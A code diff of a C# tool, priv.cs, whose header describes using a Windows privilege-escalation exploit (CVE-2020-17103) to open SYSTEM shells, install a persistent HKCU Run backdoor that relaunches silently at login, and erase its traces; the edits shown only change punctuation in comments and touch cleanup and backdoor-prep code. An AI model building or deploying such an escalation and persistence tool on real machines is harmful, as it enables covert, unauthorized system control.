@@ -1,19 +1,19 @@
 /*
- * priv.cs - SYSTEM shell launcher
+ * priv.cs  SYSTEM shell launcher
  *
  * Uses MiniPlasma (CVE-2020-17103) to escalate to SYSTEM then drops into
  * an interactive SYSTEM cmd in the same terminal window.
  *
  * MODES:
- *   priv.exe           - escalate + open SYSTEM shell in current terminal
- *   priv.exe install   - install to user PATH + persistent doskey alias
- *   priv.exe --unpriv  - cleanup registry + remove install artifacts
+ *   priv.exe           escalate + open SYSTEM shell in current terminal
+ *   priv.exe install   install to user PATH + persistent doskey alias
+ *   priv.exe --unpriv  cleanup registry + remove install artifacts
  *
  * INSIDE SYSTEM SHELL (doskey macros):
- *   power              - open PowerShell as SYSTEM in same window
- *   cmdnew             - open new SYSTEM cmd window
- *   psnew              - open new SYSTEM PowerShell window
- *   unpriv             - cleanup registry + exit SYSTEM shell
+ *   power              open PowerShell as SYSTEM in same window
+ *   cmdnew             open new SYSTEM cmd window
+ *   psnew              open new SYSTEM PowerShell window
+ *   unpriv             cleanup registry + exit SYSTEM shell
  *
  * BACKDOOR (after install):
  *   A HKCU Run entry re-runs priv.exe silently on next login,
@@ -302,7 +302,7 @@ if($r-eq 0){
     {
         /* Remove CloudFiles key */
         try { RecDelete(CF); } catch {}
-        /* Remove Volatile Environment windir (delete whole key - it's volatile) */
+        /* Remove Volatile Environment windir (delete whole key (volatile)) */
         try { RecDelete(TK); } catch {}
         /* Remove run dir */
         try {
@@ -396,7 +396,7 @@ if($r-eq 0){
         Console.WriteLine("\n[+] Uninstall complete. All traces removed.");
     }
 
-    /* Stage 1 only - fast re-prep for backdoor */
+    /* Stage 1 only, fast re-prep for backdoor */
     static void Prep()
     {
         try {
